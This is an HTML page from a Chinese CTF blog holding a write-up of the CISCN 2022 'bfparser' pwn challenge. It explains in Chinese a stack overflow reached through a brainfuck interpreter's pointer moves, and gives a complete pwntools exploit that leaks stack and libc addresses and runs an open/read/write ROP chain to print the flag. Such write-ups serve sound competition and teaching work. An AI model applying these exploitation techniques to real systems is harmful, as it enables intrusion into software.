@@ -1,0 +1,298 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CISCN-2022-西南分区赛PWN WP | kotori的菜园</title>
+<link rel="shortcut icon" href="https://kotoriseed.github.io//favicon.ico?v=1718591155332">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://kotoriseed.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="CISCN-2022-西南分区赛PWN WP | kotori的菜园 - Atom Feed" href="https://kotoriseed.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJDEM99E9P"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PJDEM99E9P');
+</script>
+
+
+    <meta name="description" content="bfparser
+分析
+
+保护是全开了的。
+看看main函数
+
+分配了一个0x1000的chunk来写入数据。在sub_13BA()里进行了一定的预处理。
+然后开了沙箱，只能orw
+
+关键漏洞出在sub_163F()
+
+这里有一个__asm..." />
+    <meta name="keywords" content="WP" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://kotoriseed.github.io/">
+  <img class="avatar" src="https://kotoriseed.github.io//images/avatar.png?v=1718591155332" alt="">
+  </a>
+  <h1 class="site-title">
+    kotori的菜园
+  </h1>
+  <p class="site-description">
+    挑战者贵为永恒黄金
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              CISCN-2022-西南分区赛PWN WP
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-06-27
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://kotoriseed.github.io/tag/0eC34PvND/" class="post-tag">
+                  # WP
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="bfparser">bfparser</h1>
+<h2 id="分析">分析</h2>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/06/27/21f21a7acbd10.png" alt="1656297240746.png" loading="lazy"></figure>
+<p>保护是全开了的。</p>
+<p>看看main函数</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/06/27/90d93db931fe0.png" alt="1656297278557.png" loading="lazy"></figure>
+<p>分配了一个0x1000的chunk来写入数据。在sub_13BA()里进行了一定的预处理。</p>
+<p>然后开了沙箱，只能orw</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/06/27/960d481a96656.png" alt="1656298451568.png" loading="lazy"></figure>
+<p>关键漏洞出在sub_163F()</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/06/27/4564d4d49cffd.png" alt="1656297389262.png" loading="lazy"></figure>
+<p>这里有一个<code>__asm{ jmp rax }</code>，估计是跳表需要修复，懒得修了，直接看汇编吧</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/06/27/01af486ed28b1.png" alt="1656297448778.png" loading="lazy"></figure>
+<p>可以看到，根据输入的东西不同，执行不一样的操作。结合标题的bf，可以想到<code>brainfuck</code>语言</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/06/27/e6a4e3913567f.png" alt="1656297623187.png" loading="lazy"></figure>
+<p>百度了之后，发现bf语言的语法其实非常简洁。值得注意的是，他有移动指针和修改指针内容的功能。</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/06/27/0fd0f0387aa12.png" alt="1656297698315.png" loading="lazy"></figure>
+<p>此函数是通过<code>v2</code>这个变量模拟的bf语言运行的空间。不难看出，移动指针可以导致栈溢出。</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/06/27/83de348633043.png" alt="1656297878295.png" loading="lazy"></figure>
+<p>他的指针操作是由一个变量当做下标来实现的，不幸的是，他一次只会移动1字节。</p>
+<p>如果单纯使用<code>'&gt;'*n</code>的方式来移动的话，他初始位于rbp-0x210，想要劫持到返回地址就需要0x218*8个字节的数据，已经超过了题目给的0x1000。</p>
+<p>一开始我想的是劫持[rbp-0x214]这个指针，但是由于个人太菜了，没有成功。(感觉是负数的问题)</p>
+<p>于是去想办法简化bf语言的payload。</p>
+<p>最后想到的是用 <code>+[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;,]</code> 通过自己的输入来有限控制指针循环移动</p>
+<p>然后经过不断的二分调试，最终确定了payload让指针到了返回地址</p>
+<p>（这里劫持的是main函数的栈帧，也就是 <code>__libc_start_main+243</code>）</p>
+<pre><code>pay = '+[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;,]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/06/27/52fcf4d7bc9c4.png" alt="1656299307186.png" loading="lazy"></figure>
+<p>劫持到这里主要是觉得方便leak libc和栈基址。（中途脑袋抽了，还把pie基址一块leak了，当时想的是rop要用gadgets，然而最后还是直接用的libc的gadgets）</p>
+<p>leak之后就简单了，直接rop去写orw。</p>
+<h2 id="exp">exp</h2>
+<pre><code class="language-python">from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+p = process('./pwn')
+elf = ELF('./pwn')
+libc = ELF('./libc.so.6')
+# p = remote('192.168.0.76', 58011)
+# p.recvuntil('TEST')
+'''
+pop_rdi = 0x0000000000000973 # pop rdi ; ret
+ret = 0x000000000000001a # ret
+'''
+pay = '+[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;,]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'
+
+pay += '&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'*2
+pay += '.&gt;'*8
+pay += '&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'
+
+pay += '.&gt;'*8
+pay += '&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;'*5
+
+pay += '.&gt;'*8
+pay += '&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;'
+pay += ',&gt;'*8 * 22
+
+# pay += '.'
+
+# gdb.attach(p)
+
+dd = '0'*0x40 + '\x00'
+
+p.sendline(pay)
+gdb.attach(p)
+
+p.send(dd)
+
+stack = u64(p.recvuntil(b'\x7f')[-6:].ljust(0x8, b'\x00'))-0xf0
+print(hex(stack))
+
+pie = u64(p.recvuntil(b'\x55')[-6:].ljust(0x8, b'\x00')) - 0x854
+print(hex(pie))
+
+libcbase = u64(p.recvuntil(b'\x7f')[-6:].ljust(0x8, b'\x00')) - 0x24083
+print(hex(libcbase))
+'''
+one = [0xe3afe, 0xe3b01, 0xe3b04]
+# print(hex(libcbase + one[0]))
+p.sendline(p64(one[2]+libcbase))
+'''
+pop_rdi = libcbase + 0x0000000000023b6a # pop rdi ; ret
+pop_rsi = libcbase + 0x000000000002601f # pop rsi ; ret
+pop_rdx = libcbase + 0x0000000000142c92 # pop rdx ; ret
+
+op = libcbase + libc.symbols['open']
+re = libcbase + libc.symbols['read']
+wr = libcbase + libc.symbols['write']
+
+pay = p64(pop_rdi) + p64(stack+8*21) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(op)
+pay += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(stack-0x100) + p64(pop_rdx)+p64(0x30)+p64(re)
+pay += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(stack-0x100) + p64(pop_rdx)+p64(0x30)+p64(wr)
+pay += b'./flag\x00\x00'
+p.send(pay)
+
+p.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#bfparser">bfparser</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90">分析</a></li>
+<li><a href="#exp">exp</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://kotoriseed.github.io/post/浅谈ret2dlreslove/">
+              <h3 class="post-title">
+                浅谈基于_dl_runtime_resolve的利用
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://kotoriseed.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
